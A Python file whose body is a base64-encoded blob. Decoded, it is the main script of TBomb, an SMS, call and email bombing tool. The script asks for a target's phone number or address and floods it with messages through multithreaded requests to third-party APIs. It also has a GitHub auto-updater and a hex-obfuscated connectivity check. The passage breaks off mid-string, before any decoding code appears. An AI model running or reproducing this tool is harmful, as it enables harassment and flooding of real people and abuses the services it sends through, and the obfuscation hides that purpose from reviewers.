import base64,codecs
main = "IyEvdXNyL2Jpbi9weXRob24KIyAtKi0gY29kaW5nOiBVVEYtOCAtKi0KCmltcG9ydCBvcwppbXBvcnQgc2h1dGlsCmltcG9ydCBzeXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN0cmluZwppbXBvcnQgcmFuZG9tCmltcG9ydCBqc29uCmltcG9ydCByZQppbXBvcnQgdGltZQppbXBvcnQgYXJncGFyc2UKaW1wb3J0IHppcGZpbGUKZnJvbSBpbyBpbXBvcnQgQnl0ZXNJTwoKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciwgYXNfY29tcGxldGVkCgpmcm9tIHV0aWxzLmRlY29yYXRvcnMgaW1wb3J0IE1lc3NhZ2VEZWNvcmF0b3IKZnJvbSB1dGlscy5wcm92aWRlciBpbXBvcnQgQVBJUHJvdmlkZXIKCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwogICAgZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgU3R5bGUKZXhjZXB0IEltcG9ydEVycm9yOgogICAgcHJpbnQoIlx0U29tZSBkZXBlbmRlbmNpZXMgY291bGQgbm90IGJlIGltcG9ydGVkIChwb3NzaWJseSBub3QgaW5zdGFsbGVkKSIpCiAgICBwcmludCgKICAgICAgICAiVHlwZSBgcGlwMyBpbnN0YWxsIC1yIHJlcXVpcmVtZW50cy50eHRgIHRvICIKICAgICAgICAiIGluc3RhbGwgYWxsIHJlcXVpcmVkIHBhY2thZ2VzIikKICAgIHN5cy5leGl0KDEpCgoKZGVmIHJlYWRpc2RjKCk6CiAgICB3aXRoIG9wZW4oImlzZGNvZGVzLmpzb24iKSBhcyBmaWxlOgogICAgICAgIGlzZGNvZGVzID0ganNvbi5sb2FkKGZpbGUpCiAgICByZXR1cm4gaXNkY29kZXMKCgpkZWYgZ2V0X3ZlcnNpb24oKToKICAgIHRyeToKICAgICAgICByZXR1cm4gb3BlbigiLnZlcnNpb24iLCAiciIpLnJlYWQoKS5zdHJpcCgpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJldHVybiAnMS4wJwoKCmRlZiBjbHIoKToKICAgIGlmIG9zLm5hbWUgPT0gIm50IjoKICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQoKCmRlZiBiYW5uX3RleHQoKToKICAgIGNscigpCiAgICBsb2dvID0gIiIiCiAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCDilojilojilojilojiloggICAgICAgICAgICAgICAgIOKWiOKWiAogICDilpLilpLilpLilojilojilpLilpLilpIg4paI4paI4paS4paS4paI4paIICAgICAgICAgICAgICAgIOKWiOKWiAogICAgICDilojiloggICAg4paI4paIICDilojiloggICAgICAgIOKWiOKWiCAgIOKWiOKWiCDilojilogKICAgICAg4paI4paIICAgIOKWiOKWiOKWiOKWiOKWiOKWkiAg4paI4paI4paI4paIICDilojilojilogg4paI4paI4paIIOKWiOKWiOKWiOKWiOKWiAogICAgICDilojiloggICAg4paI4paI4paS4paS4paI4paIIOKWiOKWiCAg4paI4paIIOKWiOKWiOKWkuKWiOKWkuKWiOKWiCDilojilojilpLilpLilojilogKICAgICAg4paI4paIICAgIOKWiOKWiCAg4paI4paIIOKWiOKWiCAg4paI4paIIOKWiOKWiCDilpIg4paI4paIIOKWiOKWiCAg4paI4paICiAgICAgIOKWiOKWiCAgICDilojilojilojilojilojilpIg4paS4paI4paI4paI4paI4paSIOKWiOKWiCAgIOKWiOKWiCDilojilojilojilojilojilpIKICAgICAg4paS4paSICAgIOKWkuKWkuKWkuKWkuKWkiAgIOKWkuKWkuKWkuKWkiAg4paS4paSICAg4paS4paSIOKWkuKWkuKWkuKWkuKWkgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiIgogICAgaWYgQVNDSUlfTU9ERToKICAgICAgICBsb2dvID0gIiIKICAgIHZlcnNpb24gPSAiVmVyc2lvbjogIitfX1ZFUlNJT05fXwogICAgY29udHJpYnV0b3JzID0gIkNvbnRyaWJ1dG9yczogIisiICIuam9pbihfX0NPTlRSSUJVVE9SU19fKQogICAgcHJpbnQocmFuZG9tLmNob2ljZShBTExfQ09MT1JTKSArIGxvZ28gKyBSRVNFVF9BTEwpCiAgICBtZXNnZGNydC5TdWNjZXNzTWVzc2FnZSh2ZXJzaW9uKQogICAgbWVzZ2RjcnQuU2VjdGlvbk1lc3NhZ2UoY29udHJpYnV0b3JzKQogICAgcHJpbnQoKQoKCmRlZiBjaGVja19pbnRyKCk6CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMuZ2V0KCJceDY4XHg3NFx4NzRceDcwXHg3M1x4M2FceDJmXHgyZlx4NmRceDZmXHg3NFx4NjhceDY1XHg3Mlx4NjZceDc1XHg2M1x4NmJceDY5XHg2ZVx4NjdceDc3XHg2NVx4NjJceDczXHg2OVx4NzRceDY1XHgyZVx4NjNceDZmXHg2ZCIpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIGJhbm5fdGV4dCgpCiAgICAgICAgbWVzZ2RjcnQuRmFpbHVyZU1lc3NhZ2UoIlBvb3IgaW50ZXJuZXQgY29ubmVjdGlvbiBkZXRlY3RlZCIpCiAgICAgICAgc3lzLmV4aXQoMikKCgpkZWYgZm9ybWF0X3Bob25lKG51bSk6CiAgICBudW0gPSBbbiBmb3IgbiBpbiBudW0gaWYgbiBpbiBzdHJpbmcuZGlnaXRzXQogICAgcmV0dXJuICcnLmpvaW4obnVtKS5zdHJpcCgpCgoKZGVmIGRvX3ppcF91cGRhdGUoKToKICAgIHN1Y2Nlc3MgPSBGYWxzZQogICAgaWYgREVCVUdfTU9ERToKICAgICAgICB6aXBfdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9UaGVTcGVlZFgvVEJvbWIvYXJjaGl2ZS9kZXYuemlwIgogICAgICAgIGRpcl9uYW1lID0gIlRCb21iLWRldiIKICAgIGVsc2U6CiAgICAgICAgemlwX3VybCA9ICJodHRwczovL2dpdGh1Yi5jb20vVGhlU3BlZWRYL1RCb21iL2FyY2hpdmUvbWFzdGVyLnppcCIKICAgICAgICBkaXJfbmFtZSA9ICJUQm9tYi1tYXN0ZXIiCiAgICBwcmludChBTExfQ09MT1JTWzBdKyJEb3dubG9hZGluZyBaSVAgLi4uICIrUkVTRVRfQUxMKQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoemlwX3VybCkKICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICB6aXBfY29udGVudCA9IHJlc3BvbnNlLmNvbnRlbnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKEJ5dGVzSU8oemlwX2NvbnRlbnQpKSBhcyB6aXBfZmlsZToKICAgICAgICAgICAgICAgIGZvciBtZW1iZXIgaW4gemlwX2ZpbGUubmFtZWxpc3QoKToKICAgICAgICAgICAgICAgICAgICBmaWxlbmFtZSA9IG9zLnBhdGguc3BsaXQobWVtYmVyKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBmaWxlbmFtZVsxXToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBuZXdfZmlsZW5hbWUgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lWzBdLnJlcGxhY2UoZGlyX25hbWUsICIuIiksCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVuYW1lWzFdKQogICAgICAgICAgICAgICAgICAgIHNvdXJjZSA9IHppcF9maWxlLm9wZW4obWVtYmVyKQogICAgICAgICAgICAgICAgICAgIHRhcmdldCA9IG9wZW4obmV3X2ZpbGVuYW1lLCAid2IiKQogICAgICAgICAgICAgICAgICAgIHdpdGggc291cmNlLCB0YXJnZXQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihzb3VyY2UsIHRhcmdldCkKICAgICAgICAgICAgc3VjY2VzcyA9IFRydWUKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBtZXNnZGNydC5GYWlsdXJlTWVzc2FnZSgiRXJyb3Igb2NjdXJlZCB3aGlsZSBleHRyYWN0aW5nICEhIikKICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgbWVzZ2RjcnQuU3VjY2Vzc01lc3NhZ2UoIlRCb21iIHdhcyB1cGRhdGVkIHRvIHRoZSBsYXRlc3QgdmVyc2lvbiIpCiAgICAgICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoCiAgICAgICAgICAgICJQbGVhc2UgcnVuIHRoZSBzY3JpcHQgYWdhaW4gdG8gbG9hZCB0aGUgbGF0ZXN0IHZlcnNpb24iKQogICAgZWxzZToKICAgICAgICBtZXNnZGNydC5GYWlsdXJlTWVzc2FnZSgiVW5hYmxlIHRvIHVwZGF0ZSBUQm9tYi4iKQogICAgICAgIG1lc2dkY3J0Lldhcm5pbmdNZXNzYWdlKAogICAgICAgICAgICAiR3JhYiBUaGUgTGF0ZXN0IG9uZSBGcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9IYWNrZXJTTTkvVEJvbWIuZ2l0IikKCiAgICBzeXMuZXhpdCgpCgoKZGVmIGRvX2dpdF91cGRhdGUoKToKICAgIHN1Y2Nlc3MgPSBGYWxzZQogICAgdHJ5OgogICAgICAgIHByaW50KEFMTF9DT0xPUlNbMF0rIlVQREFUSU5HICIrUkVTRVRfQUxMLCBlbmQ9JycpCiAgICAgICAgcHJvY2VzcyA9IHN1YnByb2Nlc3MuUG9wZW4oImdpdCBjaGVja291dCAuICYmIGdpdCBwdWxsICIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCkKICAgICAgICB3aGlsZSBwcm9jZXNzOgogICAgICAgICAgICBwcmludChBTExfQ09MT1JTWzBdKycuJytSRVNFVF9BTEwsIGVuZD0nJykKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICByZXR1cm5jb2RlID0gcHJvY2Vzcy5wb2xsKCkKICAgICAgICAgICAgaWYgcmV0dXJuY29kZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgc3VjY2VzcyA9IG5vdCBwcm9jZXNzLnJldHVybmNvZGUKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgc3VjY2VzcyA9IEZhbHNlCiAgICBwcmludCgiXG4iKQoKICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgbWVzZ2RjcnQuU3VjY2Vzc01lc3NhZ2UoIlRCb21iIHdhcyB1cGRhdGVkIHRvIHRoZSBsYXRlc3QgdmVyc2lvbiIpCiAgICAgICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoCiAgICAgICAgICAgICJQbGVhc2UgcnVuIHRoZSBzY3JpcHQgYWdhaW4gdG8gbG9hZCB0aGUgbGF0ZXN0IHZlcnNpb24iKQogICAgZWxzZToKICAgICAgICBtZXNnZGNydC5GYWlsdXJlTWVzc2FnZSgiVW5hYmxlIHRvIHVwZGF0ZSBUQm9tYi4iKQogICAgICAgIG1lc2dkY3J0Lldhcm5pbmdNZXNzYWdlKCJNYWtlIFN1cmUgVG8gSW5zdGFsbCAnZ2l0JyAiKQogICAgICAgIG1lc2dkY3J0LkdlbmVyYWxNZXNzYWdlKCJUaGVuIHJ1biBjb21tYW5kOiIpCiAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICJnaXQgY2hlY2tvdXQgLiAmJiAiCiAgICAgICAgICAgICJnaXQgcHVsbCBodHRwczovL2dpdGh1Yi5jb20vSGFja2VyU005L1RCb21iLmdpdCBIRUFEIikKICAgIHN5cy5leGl0KCkKCgpkZWYgdXBkYXRlKCk6CiAgICBpZiBzaHV0aWwud2hpY2goJ2dpdCcpOgogICAgICAgIGRvX2dpdF91cGRhdGUoKQogICAgZWxzZToKICAgICAgICBkb196aXBfdXBkYXRlKCkKCgpkZWYgY2hlY2tfZm9yX3VwZGF0ZXMoKToKICAgIGlmIERFQlVHX01PREU6CiAgICAgICAgbWVzZ2RjcnQuV2FybmluZ01lc3NhZ2UoCiAgICAgICAgICAgICJERUJVRyBNT0RFIEVuYWJsZWQhIEF1dG8tVXBkYXRlIGNoZWNrIGlzIGRpc2FibGVkLiIpCiAgICAgICAgcmV0dXJuCiAgICBtZXNnZGNydC5TZWN0aW9uTWVzc2FnZSgiQ2hlY2tpbmcgZm9yIHVwZGF0ZXMiKQogICAgZnZlciA9IHJlcXVlc3RzLmdldCgKICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0hhY2tlclNNOS9UQm9tYi9tYXN0ZXIvLnZlcnNpb24iCiAgICApLnRleHQuc3RyaXAoKQogICAgaWYgZnZlciAhPSBfX1ZFUlNJT05fXzoKICAgICAgICBtZXNnZGNydC5XYXJuaW5nTWVzc2FnZSgiQW4gdXBkYXRlIGlzIGF2YWlsYWJsZSIpCiAgICAgICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIlN0YXJ0aW5nIHVwZGF0ZS4uLiIpCiAgICAgICAgdXBkYXRlKCkKICAgIGVsc2U6CiAgICAgICAgbWVzZ2RjcnQuU3VjY2Vzc01lc3NhZ2UoIlRCb21iIGlzIHVwLXRvLWRhdGUiKQogICAgICAgIG1lc2dkY3J0LkdlbmVyYWxNZXNzYWdlKCJTdGFydGluZyBUQm9tYiIpCgoKZGVmIG5vdGlmeWVuKCk6CiAgICB0cnk6CiAgICAgICAgaWYgREVCVUdfTU9ERToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS9IYWNrZXJzbTkvVEJvbWIvcmF3L2Rldi8ubm90aWZ5IgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vSGFja2Vyc205L1RCb21iL3Jhdy9tYXN0ZXIvLm5vdGlmeSIKICAgICAgICBub3RpID0gcmVxdWVzdHMuZ2V0KHVybCkudGV4dC51cHBlcigpCiAgICAgICAgaWYgbGVuKG5vdGkpID4gMTA6CiAgICAgICAgICAgIG1lc2dkY3J0LlNlY3Rpb25NZXNzYWdlKCJOT1RJRklDQVRJT046ICIgKyBub3RpKQogICAgICAgICAgICBwcmludCgpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKCgpkZWYgZ2V0X3Bob25lX2luZm8oKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGFyZ2V0ID0gIiIKICAgICAgICBjYyA9IGlucHV0KG1lc2dkY3J0LkNvbW1hbmRNZXNzYWdlKAogICAgICAgICAgICAiRW50ZXIgeW91ciBjb3VudHJ5IGNvZGUgKFdpdGhvdXQgKyk6ICIpKQogICAgICAgIGNjID0gZm9ybWF0X3Bob25lKGNjKQogICAgICAgIGlmIG5vdCBjb3VudHJ5X2NvZGVzLmdldChjYywgRmFsc2UpOgogICAgICAgICAgICBtZXNnZGNydC5XYXJuaW5nTWVzc2FnZSgKICAgICAgICAgICAgICAgICJUaGUgY291bnRyeSBjb2RlICh7Y2N9KSB0aGF0IHlvdSBoYXZlIGVudGVyZWQiCiAgICAgICAgICAgICAgICAiIGlzIGludmFsaWQgb3IgdW5zdXBwb3J0ZWQiLmZvcm1hdChjYz1jYykpCiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgdGFyZ2V0ID0gaW5wdXQobWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UoCiAgICAgICAgICAgICJFbnRlciB0aGUgdGFyZ2V0IG51bWJlcjogKyIgKyBjYyArICIgIikpCiAgICAgICAgdGFyZ2V0ID0gZm9ybWF0X3Bob25lKHRhcmdldCkKICAgICAgICBpZiAoKGxlbih0YXJnZXQpIDw9IDYpIG9yIChsZW4odGFyZ2V0KSA+PSAxMikpOgogICAgICAgICAgICBtZXNnZGNydC5XYXJuaW5nTWVzc2FnZSgKICAgICAgICAgICAgICAgICJUaGUgcGhvbmUgbnVtYmVyICh7dGFyZ2V0fSkiLmZvcm1hdCh0YXJnZXQ9dGFyZ2V0KSArCiAgICAgICAgICAgICAgICAidGhhdCB5b3UgaGF2ZSBlbnRlcmVkIGlzIGludmFsaWQiKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIHJldHVybiAoY2MsIHRhcmdldCkKCgpkZWYgZ2V0X21haWxfaW5mbygpOgogICAgbWFpbF9yZWdleCA9IHInXlthLXowLTldK1tcLl9dP1thLXowLTldK1tAXVx3K1suXVx3ezIsM30kJwogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0YXJnZXQgPSBpbnB1dChtZXNnZGNydC5Db21tYW5kTWVzc2FnZSgiRW50ZXIgdGFyZ2V0IG1haWw6ICIpKQogICAgICAgIGlmIG5vdCByZS5zZWFyY2gobWFpbF9yZWdleCwgdGFyZ2V0LCByZS5JR05PUkVDQVNFKToKICAgICAgICAgICAgbWVzZ2RjcnQuV2FybmluZ01lc3NhZ2UoCiAgICAgICAgICAgICAgICAiVGhlIG1haWwgKHt0YXJnZXR9KSIuZm9ybWF0KHRhcmdldD10YXJnZXQpICsKICAgICAgICAgICAgICAgICIgdGhhdCB5b3UgaGF2ZSBlbnRlcmVkIGlzIGludmFsaWQiKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIHJldHVybiB0YXJnZXQKCgpkZWYgcHJldHR5X3ByaW50KGNjLCB0YXJnZXQsIHN1Y2Nlc3MsIGZhaWxlZCk6CiAgICByZXF1ZXN0ZWQgPSBzdWNjZXNzK2ZhaWxlZAogICAgbWVzZ2RjcnQuU2VjdGlvbk1lc3NhZ2UoIkJvbWJpbmcgaXMgaW4gcHJvZ3Jlc3MgLSBQbGVhc2UgYmUgcGF0aWVudCIpCiAgICBtZXNnZGNydC5HZW5lcmFsTWVzc2FnZSgKICAgICAgICAiUGxlYXNlIHN0YXkgY29ubmVjdGVkIHRvIHRoZSBpbnRlcm5ldCBkdXJpbmcgYm9tYmluZyIpCiAgICBtZXNnZGNydC5HZW5lcmFsTWVzc2FnZSgiVGFyZ2V0ICAgICAgIDogIiArIGNjICsgIiAiICsgdGFyZ2V0KQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIlNlbnQgICAgICAgICA6ICIgKyBzdHIocmVxdWVzdGVkKSkKICAgIG1lc2dkY3J0LkdlbmVyYWxNZXNzYWdlKCJTdWNjZXNzZnVsICAgOiAiICsgc3RyKHN1Y2Nlc3MpKQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIkZhaWxlZCAgICAgICA6ICIgKyBzdHIoZmFpbGVkKSkKICAgIG1lc2dkY3J0Lldhcm5pbmdNZXNzYWdlKAogICAgICAgICJUaGlzIHRvb2wgd2FzIG1hZGUgZm9yIGZ1biBhbmQgcmVzZWFyY2ggcHVycG9zZXMgb25seSIpCiAgICBtZXNnZGNydC5TdWNjZXNzTWVzc2FnZSgiVEJvbWIgd2FzIGNyZWF0ZWQgYnkgU3BlZWRYIikKCgpkZWYgd29ya2Vybm9kZShtb2RlLCBjYywgdGFyZ2V0LCBjb3VudCwgZGVsYXksIG1heF90aHJlYWRzKToKCiAgICBhcGkgPSBBUElQcm92aWRlcihjYywgdGFyZ2V0LCBtb2RlLCBkZWxheT1kZWxheSkKICAgIGNscigpCiAgICBtZXNnZGNydC5TZWN0aW9uTWVzc2FnZSgiR2VhcmluZyB1cCB0aGUgQm9tYmVyIC0gUGxlYXNlIGJlIHBhdGllbnQiKQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoCiAgICAgICAgIlBsZWFzZSBzdGF5IGNvbm5lY3RlZCB0byB0aGUgaW50ZXJuZXQgZHVyaW5nIGJvbWJpbmciKQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIkFQSSBWZXJzaW9uICAgOiAiICsgYXBpLmFwaV92ZXJzaW9uKQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIlRhcmdldCAgICAgICAgOiAiICsgY2MgKyB0YXJnZXQpCiAgICBtZXNnZGNydC5HZW5lcmFsTWVzc2FnZSgiQW1vdW50ICAgICAgICA6ICIgKyBzdHIoY291bnQpKQogICAgbWVzZ2RjcnQuR2VuZXJhbE1lc3NhZ2UoIlRocmVhZHMgICAgICAgOiAiICsgc3RyKG1heF90aHJlYWRzKSArICIgdGhyZWFkcyIpCiAgICBtZXNnZGNydC5HZW5lcmFsTWVzc2FnZSgiRGVsYXkgICAgICAgICA6ICIgKyBzdHIoZGVsYXkpICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICIgc2Vjb25kcyIpCiAgICBtZXNnZGNydC5XYXJuaW5nTWVzc2FnZSgKICAgICAgICAiVGhpcyB0b29sIHdhcyBtYWRlIGZvciBmdW4gYW5kIHJlc2VhcmNoIHB1cnBvc2VzIG9ubHkiKQogICAgcHJpbnQoKQogICAgaW5wdXQobWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UoCiAgICAgICAgIlByZXNzIFtDVFJMK1pdIHRvIHN1c3BlbmQgdGhlIGJvbWJlciBvciBbRU5URVJdIHRvIHJlc3VtZSBpdCIpKQoKICAgIGlmIGxlbihBUElQcm92aWRlci5hcGlfcHJvdmlkZXJzKSA9PSAwOgogICAgICAgIG1lc2dkY3J0LkZhaWx1cmVNZXNzYWdlKCJZb3VyIGNvdW50cnkvdGFyZ2V0IGlzIG5vdCBzdXBwb3J0ZWQgeWV0IikKICAgICAgICBtZXNnZGNydC5HZW5lcmFsTWVzc2FnZSgiRmVlbCBmcmVlIHRvIHJlYWNoIG91dCB0byB1cyIpCiAgICAgICAgaW5wdXQobWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UoIlByZXNzIFtFTlRFUl0gdG8gZXhpdCIpKQogICAgICAgIGJhbm5fdGV4dCgpCiAgICAgICAgc3lzLmV4aXQoKQoKICAgIHN1Y2Nlc3MsIGZhaWxlZCA9IDAsIDAKICAgIHdoaWxlIHN1Y2Nlc3MgPCBjb3VudDoKICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfdGhyZWFkcykgYXMgZXhlY3V0b3I6CiAgICAgICAgICAgIGpvYnMgPSBbXQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShjb3VudC1zdWNjZXNzKToKICAgICAgICAgICAgICAgIGpvYnMuYXBwZW5kKGV4ZWN1dG9yLnN1Ym1pdChhcGkuaGl0KSkKCiAgICAgICAgICAgIGZvciBqb2IgaW4gYXNfY29tcGxldGVkKGpvYnMpOgogICAgICAgICAgICAgICAgcmVzdWx0ID0gam9iLnJlc3VsdCgpCiAgICAgICAgICAgICAgICBpZiByZXN1bHQgaXMgTm9uZToKICAgICAgICAgICAgICAgICAgICBtZXNnZGNydC5GYWlsdXJlTWVzc2FnZSgKICAgICAgICAgICAgICAgICAgICAgICAgIkJvbWJpbmcgbGltaXQgZm9yIHlvdXIgdGFyZ2V0IGhhcyBiZWVuIHJlYWNoZWQiKQogICAgICAgICAgICAgICAgICAgIG1lc2dkY3J0LkdlbmVyYWxNZXNzYWdlKCJUcnkgQWdhaW4gTGF0ZXIgISEiKQogICAgICAgICAgICAgICAgICAgIGlucHV0KG1lc2dkY3J0LkNvbW1hbmRNZXNzYWdlKCJQcmVzcyBbRU5URVJdIHRvIGV4aXQiKSkKICAgICAgICAgICAgICAgICAgICBiYW5uX3RleHQoKQogICAgICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgICAgICAgICAgIGlmIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzICs9IDEKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZmFpbGVkICs9IDEKICAgICAgICAgICAgICAgIGNscigpCiAgICAgICAgICAgICAgICBwcmV0dHlfcHJpbnQoY2MsIHRhcmdldCwgc3VjY2VzcywgZmFpbGVkKQogICAgcHJpbnQoIlxuIikKICAgIG1lc2dkY3J0LlN1Y2Nlc3NNZXNzYWdlKCJCb21iaW5nIGNvbXBsZXRlZCEiKQogICAgdGltZS5zbGVlcCgxLjUpCiAgICBiYW5uX3RleHQoKQogICAgc3lzLmV4aXQoKQoKCmRlZiBzZWxlY3Rub2RlKG1vZGU9InNtcyIpOgogICAgbW9kZSA9IG1vZGUubG93ZXIoKS5zdHJpcCgpCiAgICB0cnk6CiAgICAgICAgY2xyKCkKICAgICAgICBiYW5uX3RleHQoKQogICAgICAgIGNoZWNrX2ludHIoKQogICAgICAgIGNoZWNrX2Zvcl91cGRhdGVzKCkKICAgICAgICBub3RpZnllbigpCgogICAgICAgIG1heF9saW1pdCA9IHsic21zIjogNTAwLCAiY2FsbCI6IDE1LCAibWFpbCI6IDIwMH0KICAgICAgICBjYywgdGFyZ2V0ID0gIiIsICIiCiAgICAgICAgaWYgbW9kZSBpbiBbInNtcyIsICJjYWxsIl06CiAgICAgICAgICAgIGNjLCB0YXJnZXQgPSBnZXRfcGhvbmVfaW5mbygpCiAgICAgICAgICAgIGlmIGNjICE9ICI5MSI6CiAgICAgICAgICAgICAgICBtYXhfbGltaXQudXBkYXRlKHsic21zIjogMTAwfSkKICAgICAgICBlbGlmIG1vZGUgPT0gIm1haWwiOgogICAgICAgICAgICB0YXJnZXQgPSBnZXRfbWFpbF9pbmZvKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICByYWlzZSBLZXlib2FyZEludGVycnVwdAoKICAgICAgICBsaW1pdCA9IG1heF9saW1pdFttb2RlXQogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAoIkVudGVyIG51bWJlciBvZiB7dHlwZX0iLmZvcm1hdCh0eXBlPW1vZGUudXBwZXIoKSkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAiIHRvIHNlbmQgKE1heCB7bGltaXR9KTogIi5mb3JtYXQobGltaXQ9bGltaXQpKQogICAgICAgICAgICAgICAgY291bnQgPSBpbnQoaW5wdXQobWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UobWVzc2FnZSkpLnN0cmlwKCkpCiAgICAgICAgICAgICAgICBpZiBjb3VudCA+IGxpbWl0IG9yIGNvdW50ID09IDA6CiAgICAgICAgICAgICAgICAgICAgbWVzZ2RjcnQuV2FybmluZ01lc3NhZ2UoIllvdSBoYXZlIHJlcXVlc3RlZCAiICsgc3RyKGNvdW50KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgIiB7dHlwZX0iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZT1tb2RlLnVwcGVyKCkpKQogICAgICAgICAgICAgICAgICAgIG1lc2dkY3J0LkdlbmVyYWxNZXNzYWdlKAogICAgICAgICAgICAgICAgICAgICAgICAiQXV0b21hdGljYWxseSBjYXBwaW5nIHRoZSB2YWx1ZSIKICAgICAgICAgICAgICAgICAgICAgICAgIiB0byB7bGltaXR9Ii5mb3JtYXQobGltaXQ9bGltaXQpKQogICAgICAgICAgICAgICAgICAgIGNvdW50ID0gbGltaXQKICAgICAgICAgICAgICAgIGRlbGF5ID0gZmxvYXQoaW5wdXQoCiAgICAgICAgICAgICAgICAgICAgbWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UoIkVudGVyIGRlbGF5IHRpbWUgKGluIHNlY29uZHMpOiAiKSkKICAgICAgICAgICAgICAgICAgICAuc3RyaXAoKSkKICAgICAgICAgICAgICAgICMgZGVsYXkgPSAwCiAgICAgICAgICAgICAgICBtYXhfdGhyZWFkX2xpbWl0ID0gKGNvdW50Ly8xMCkgaWYgKGNvdW50Ly8xMCkgPiAwIGVsc2UgMQogICAgICAgICAgICAgICAgbWF4X3RocmVhZHMgPSBpbnQoaW5wdXQoCiAgICAgICAgICAgICAgICAgICAgbWVzZ2RjcnQuQ29tbWFuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICJFbnRlciBOdW1iZXIgb2YgVGhyZWFkIChSZWNvbW1lbmRlZDoge21heF9saW1pdH0pOiAiCiAgICAgICAgICAgICAgICAgICAgICAgIC5mb3JtYXQobWF4X2xpbWl0PW1heF90aHJlYWRfbGltaXQpKSkKICAgICAgICAgICAgICAgICAgICAuc3RyaXAoKSkKICAgICAgICAgICAgICAgIG1heF90aHJlYWRzID0gbWF4X3RocmVhZHMgaWYgKAogICAgICAgICAgICAgICAgICAgIG1heF90aHJlYWRzID4gMCkgZWxzZSBtYXhfdGhyZWFkX2xpbWl0CiAgICAgICAgICAgICAgICBpZiAoY291bnQgPCAwIG9yIGRlbGF5IDwgMCk6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQgYXMga2k6CiAgICAgICAgICAgICAgICByYWlzZSBraQogICAgICAgICAgICBleGNlcHQgRXhj